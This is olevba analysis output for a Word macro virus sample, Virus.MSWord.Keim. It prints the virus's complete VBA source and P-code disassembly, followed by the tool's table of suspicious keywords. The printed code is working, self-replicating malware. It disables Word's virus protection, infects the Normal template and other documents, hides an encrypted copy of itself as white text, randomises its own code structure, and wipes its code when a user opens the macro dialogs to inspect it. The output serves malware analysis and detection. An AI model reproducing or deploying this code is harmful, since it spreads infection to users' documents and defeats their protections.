olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Keim
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Keim - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Keim - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Dim anzvar As Integer, chiffre As String, zaehler As Long
Dim var(1 To 50) As String, neuvar(1 To 50) As String
Dim start(0 To 35) As Integer
Dim newplace(1 To 35) As Integer
Dim zeilen(0 To 35) As String
If ActiveDocument.Saved = True Then GoTo Ende
'VL
Set host = NormalTemplate.VBProject.VBComponents.Item(1)
Set target = ActiveDocument.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
Options.SaveNormalPrompt = True
Options.ConfirmConversions = False
Application.ScreenUpdating = False
target.CodeModule.DeleteLines 1, target.CodeModule.CountOfLines
Randomize
ActiveDocument.Content.InsertAfter Chr$(13)
neulist = "';"
With host.CodeModule
codeschluessel = Int(Rnd() * 20 + 1)
ActiveDocument.Content.InsertAfter Chr(codeschluessel + 40)
zaehler = 1
While (Mid(.Lines(zaehler, 1), 1, 2) <> "';" And .CountOfLines > i)
zaehler = zaehler + 1
Wend
';vcode;laenge;flag;zeichen;chiffre;neuvar;anzvar;neuzeile;zeile;Ausstieg;Ende;Keimzelle;var;neulist;Changename;Zeile;target;host;zaehler;zaehler2;maxlabel;labe;codeschluessel;newplace;start;zahl;
anzvar = 0
zeile = .Lines(zaehler, 1)
For zeichen = 3 To Len(zeile)
If Mid(zeile, zeichen, 1) <> ";" Then
chiffre = chiffre + Mid(zeile, zeichen, 1)
Else
anzvar = anzvar + 1
var(anzvar) = chiffre
neuvar(anzvar) = ""
For zaehler = 1 To Len(chiffre)
neuvar(anzvar) = neuvar(anzvar) + Chr(Int(Rnd() * 25 + 65))
Next zaehler
neulist = neulist & neuvar(anzvar) & ";"
chiffre = ""
End If
Next zeichen
For zaehler = 1 To .CountOfLines
zeile = .Lines(zaehler, 1)
For zaehler2 = 1 To anzvar
If InStr(zeile, var(zaehler2)) > 0 Then
For zeichen = 1 To Len(zeile)
If Mid(zeile, zeichen, Len(var(zaehler2))) = var(zaehler2) Then Mid(zeile, zeichen) = neuvar(zaehler2)
Next zeichen
End If
Next zaehler2
neuzeile = Chr(167)
For zaehler2 = 1 To Len(zeile)
neuzeile = neuzeile & Chr(Asc(Mid(zeile, zaehler2, 1)) + codeschluessel)
Next zaehler2
vcode = vcode + neuzeile
Next zaehler
ActiveDocument.Content.InsertAfter vcode & Chr(167)
ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count).Range.Font.ColorIndex = wdWhite
For zaehler = 1 To .ProcCountLines("Keimzelle", vbext_pk_Proc)
target.CodeModule.insertlines 1, .Lines(.ProcCountLines("Keimzelle", vbext_pk_Proc) + .ProcStartLine("Keimzelle", vbext_pk_Proc) - zaehler, 1)
Next
target.CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
End With
With target.CodeModule
maxlabel = 0
For zaehler = 1 To .CountOfLines
If Mid(.Lines(zaehler, 1), 7, 1) = ":" Then start(maxlabel) = zaehler: zeilen(maxlabel) = .Lines(zaehler, 1): maxlabel = maxlabel + 1
Next zaehler
maxlabel = maxlabel - 2
For zaehler = 1 To maxlabel
flag = False
While flag = False
flag = True
zahl = Int(Rnd() * maxlabel) + 1
For zaehler2 = 1 To zaehler
If newplace(zaehler2) = zahl Then flag = False
Next zaehler2
Wend
newplace(zaehler) = zahl
Next zaehler
For zaehler = 1 To maxlabel
.DeleteLines start(zaehler), 1
.insertlines start(zaehler), zeilen(newplace(zaehler))
Next zaehler
End With
ActiveDocument.Save
Ende:   Application.ScreenUpdating = True
End Sub
Sub Keimzelle()
On Error Resume Next
label0: Set target = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: GoTo labe01
labe01: Application.ScreenUpdating = False: GoTo label1
label1: If target.Find("VL", 1, target.CountOfLines, True, False, False) Then GoTo labe13 Else GoTo labe1a
labe1a: NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: GoTo label2
label2: zeichen = ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count).Range.Text: GoTo label3
label3: codeschluessel = Asc(Mid(zeichen, 1, 1)) - 40: GoTo label4
label4: zaehler2 = 1: GoTo label5
label5: zaehler = 2: GoTo label6
label6: If zaehler <= Len(zeichen) Then GoTo label7 Else GoTo labe13
label7: If Mid(zeichen, zaehler, 1) = Chr(167) Then GoTo label8 Else GoTo labe12
label8: target.insertlines zaehler2, zeile: GoTo label9
label9: zaehler2 = zaehler2 + 1: GoTo labe10
labe10: zeile = "": GoTo labe11
labe11: zaehler = zaehler + 1: GoTo label6
labe12: zeile = zeile & (Chr(Asc(Mid(zeichen, zaehler, 1)) - codeschluessel)): GoTo labe11
labe13: ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count).Range.Delete: GoTo Ausstieg
Ausstieg: Application.ScreenUpdating = True
End Sub
Sub ToolsMacro()
For zaehler = 1 To Documents.Count
Documents(zaehler).VBProject.VBComponents(1).CodeModule.DeleteLines 1, Documents(zaehler).VBProject.VBComponents(1).CodeModule.CountOfLines
Documents(zaehler).Saved = True
Next zaehler
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.Saved = True
ShowField:  Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ViewVBCode()
For zaehler = 1 To Documents.Count
Documents(zaehler).VBProject.VBComponents(1).CodeModule.DeleteLines 1, Documents(zaehler).VBProject.VBComponents(1).CodeModule.CountOfLines
Documents(zaehler).Saved = True
Next zaehler
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.Saved = True
Show:  Application.ShowVisualBasicEditor = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Keim
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modulo1 - 8494 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Dim 
' 	VarDefn anzvar (As Integer)
' 	VarDefn chiffre (As String)
' 	VarDefn zaehler (As Long)
' Line #2:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	VarDefn var (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	VarDefn neuvar (As String)
' Line #3:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0023 
' 	VarDefn start (As Integer)
' Line #4:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0023 
' 	VarDefn newplace (As Integer)
' Line #5:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0023 
' 	VarDefn zeilen (As String)
' Line #6:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Ende 
' 	EndIf 
' Line #7:
' 	QuoteRem 0x0000 0x0002 "VL"
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set target 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld target 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld target 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #15:
' 	ArgsCall Read 0x0000 
' Line #16:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #17:
' 	LitStr 0x0002 "';"
' 	St neulist 
' Line #18:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #19:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0014 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St codeschluessel 
' Line #20:
' 	Ld codeschluessel 
' 	LitDI2 0x0028 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #21:
' 	LitDI2 0x0001 
' 	St zaehler 
' Line #22:
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "';"
' 	Ne 
' 	MemLdWith CountOfLines 
' 	Ld i 
' 	Gt 
' 	And 
' 	Paren 
' 	While 
' Line #23:
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	Add 
' 	St zaehler 
' Line #24:
' 	Wend 
' Line #25:
' 	QuoteRem 0x0000 0x00C3 ";vcode;laenge;flag;zeichen;chiffre;neuvar;anzvar;neuzeile;zeile;Ausstieg;Ende;Keimzelle;var;neulist;Changename;Zeile;target;host;zaehler;zaehler2;maxlabel;labe;codeschluessel;newplace;start;zahl;"
' Line #26:
' 	LitDI2 0x0000 
' 	St anzvar 
' Line #27:
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St zeile 
' Line #28:
' 	StartForVariable 
' 	Ld zeichen 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld zeile 
' 	FnLen 
' 	For 
' Line #29:
' 	Ld zeile 
' 	Ld zeichen 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ";"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld chiffre 
' 	Ld zeile 
' 	Ld zeichen 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St chiffre 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	Ld anzvar 
' 	LitDI2 0x0001 
' 	Add 
' 	St anzvar 
' Line #33:
' 	Ld chiffre 
' 	Ld anzvar 
' 	ArgsSt var 0x0001 
' Line #34:
' 	LitStr 0x0000 ""
' 	Ld anzvar 
' 	ArgsSt neuvar 0x0001 
' Line #35:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld chiffre 
' 	FnLen 
' 	For 
' Line #36:
' 	Ld anzvar 
' 	ArgsLd neuvar 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld anzvar 
' 	ArgsSt neuvar 0x0001 
' Line #37:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	Ld neulist 
' 	Ld anzvar 
' 	ArgsLd neuvar 0x0001 
' 	Concat 
' 	LitStr 0x0001 ";"
' 	Concat 
' 	St neulist 
' Line #39:
' 	LitStr 0x0000 ""
' 	St chiffre 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld zeichen 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #43:
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St zeile 
' Line #44:
' 	StartForVariable 
' 	Ld zaehler2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld anzvar 
' 	For 
' Line #45:
' 	Ld zeile 
' 	Ld zaehler2 
' 	ArgsLd var 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld zeichen 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld zeile 
' 	FnLen 
' 	For 
' Line #47:
' 	Ld zeile 
' 	Ld zeichen 
' 	Ld zaehler2 
' 	ArgsLd var 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld zaehler2 
' 	ArgsLd var 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld zaehler2 
' 	ArgsLd neuvar 0x0001 
' 	Ld zeile 
' 	Ld zeichen 
' 	LitDefault 
' 	Mid 
' 	EndIf 
' Line #48:
' 	StartForVariable 
' 	Ld zeichen 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Ld zaehler2 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	LitDI2 0x00A7 
' 	ArgsLd Chr 0x0001 
' 	St neuzeile 
' Line #52:
' 	StartForVariable 
' 	Ld zaehler2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld zeile 
' 	FnLen 
' 	For 
' Line #53:
' 	Ld neuzeile 
' 	Ld zeile 
' 	Ld zaehler2 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld codeschluessel 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St neuzeile 
' Line #54:
' 	StartForVariable 
' 	Ld zaehler2 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld vcode 
' 	Ld neuzeile 
' 	Add 
' 	St vcode 
' Line #56:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld vcode 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #58:
' 	Ld wdWhite 
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #59:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "Keimzelle"
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	For 
' Line #60:
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "Keimzelle"
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	LitStr 0x0009 "Keimzelle"
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcStartLine 0x0002 
' 	Add 
' 	Ld zaehler 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld target 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #61:
' 	StartForVariable 
' 	Next 
' Line #62:
' 	LitDI2 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld target 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #63:
' 	EndWith 
' Line #64:
' 	StartWithExpr 
' 	Ld target 
' 	MemLd CodeModule 
' 	With 
' Line #65:
' 	LitDI2 0x0000 
' 	St maxlabel 
' Line #66:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #67:
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld zaehler 
' 	Ld maxlabel 
' 	ArgsSt start 0x0001 
' 	BoS 0x0000 
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld maxlabel 
' 	ArgsSt zeilen 0x0001 
' 	BoS 0x0000 
' 	Ld maxlabel 
' 	LitDI2 0x0001 
' 	Add 
' 	St maxlabel 
' 	EndIf 
' Line #68:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Ld maxlabel 
' 	LitDI2 0x0002 
' 	Sub 
' 	St maxlabel 
' Line #70:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld maxlabel 
' 	For 
' Line #71:
' 	LitVarSpecial (False)
' 	St flag 
' Line #72:
' 	Ld flag 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #73:
' 	LitVarSpecial (True)
' 	St flag 
' Line #74:
' 	ArgsLd Rnd 0x0000 
' 	Ld maxlabel 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St zahl 
' Line #75:
' 	StartForVariable 
' 	Ld zaehler2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld zaehler 
' 	For 
' Line #76:
' 	Ld zaehler2 
' 	ArgsLd newplace 0x0001 
' 	Ld zahl 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St flag 
' 	EndIf 
' Line #77:
' 	StartForVariable 
' 	Ld zaehler2 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	Wend 
' Line #79:
' 	Ld zahl 
' 	Ld zaehler 
' 	ArgsSt newplace 0x0001 
' Line #80:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld maxlabel 
' 	For 
' Line #82:
' 	Ld zaehler 
' 	ArgsLd start 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #83:
' 	Ld zaehler 
' 	ArgsLd start 0x0001 
' 	Ld zaehler 
' 	ArgsLd newplace 0x0001 
' 	ArgsLd zeilen 0x0001 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #84:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	EndWith 
' Line #86:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #87:
' 	Label Ende 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub Keimzelle())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	Label label0 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set target 
' 	BoS 0x0000 
' 	GoTo labe01 
' Line #92:
' 	Label labe01 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	GoTo label1 
' Line #93:
' 	Label label1 
' 	LitStr 0x0002 "VL"
' 	LitDI2 0x0001 
' 	Ld target 
' 	MemLd CountOfLines 
' 	LitVarSpecial (True)
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Ld target 
' 	ArgsMemLd Find 0x0006 
' 	If 
' 	BoSImplicit 
' 	GoTo labe13 
' 	Else 
' 	BoSImplicit 
' 	GoTo labe1a 
' 	EndIf 
' Line #94:
' 	Label labe1a 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	GoTo label2 
' Line #95:
' 	Label label2 
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	St zeichen 
' 	BoS 0x0000 
' 	GoTo label3 
' Line #96:
' 	Label label3 
' 	Ld zeichen 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0028 
' 	Sub 
' 	St codeschluessel 
' 	BoS 0x0000 
' 	GoTo label4 
' Line #97:
' 	Label label4 
' 	LitDI2 0x0001 
' 	St zaehler2 
' 	BoS 0x0000 
' 	GoTo label5 
' Line #98:
' 	Label label5 
' 	LitDI2 0x0002 
' 	St zaehler 
' 	BoS 0x0000 
' 	GoTo label6 
' Line #99:
' 	Label label6 
' 	Ld zaehler 
' 	Ld zeichen 
' 	FnLen 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	GoTo label7 
' 	Else 
' 	BoSImplicit 
' 	GoTo labe13 
' 	EndIf 
' Line #100:
' 	Label label7 
' 	Ld zeichen 
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo label8 
' 	Else 
' 	BoSImplicit 
' 	GoTo labe12 
' 	EndIf 
' Line #101:
' 	Label label8 
' 	Ld zaehler2 
' 	Ld zeile 
' 	Ld target 
' 	ArgsMemCall insertlines 0x0002 
' 	BoS 0x0000 
' 	GoTo label9 
' Line #102:
' 	Label label9 
' 	Ld zaehler2 
' 	LitDI2 0x0001 
' 	Add 
' 	St zaehler2 
' 	BoS 0x0000 
' 	GoTo labe10 
' Line #103:
' 	Label labe10 
' 	LitStr 0x0000 ""
' 	St zeile 
' 	BoS 0x0000 
' 	GoTo labe11 
' Line #104:
' 	Label labe11 
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	Add 
' 	St zaehler 
' 	BoS 0x0000 
' 	GoTo label6 
' Line #105:
' 	Label labe12 
' 	Ld zeile 
' 	Ld zeichen 
' 	Ld zaehler 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld codeschluessel 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	St zeile 
' 	BoS 0x0000 
' 	GoTo labe11 
' Line #106:
' 	Label labe13 
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	GoTo Ausstieg 
' Line #107:
' 	Label Ausstieg 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub ToolsMacro())
' Line #110:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #111:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld zaehler 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld zaehler 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #112:
' 	LitVarSpecial (True)
' 	Ld zaehler 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #113:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #116:
' 	Label ShowField 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub ViewVBCode())
' Line #119:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #120:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld zaehler 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld zaehler 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #121:
' 	LitVarSpecial (True)
' 	Ld zaehler 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #122:
' 	StartForVariable 
' 	Ld zaehler 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #124:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #125:
' 	Label Show 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #126:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

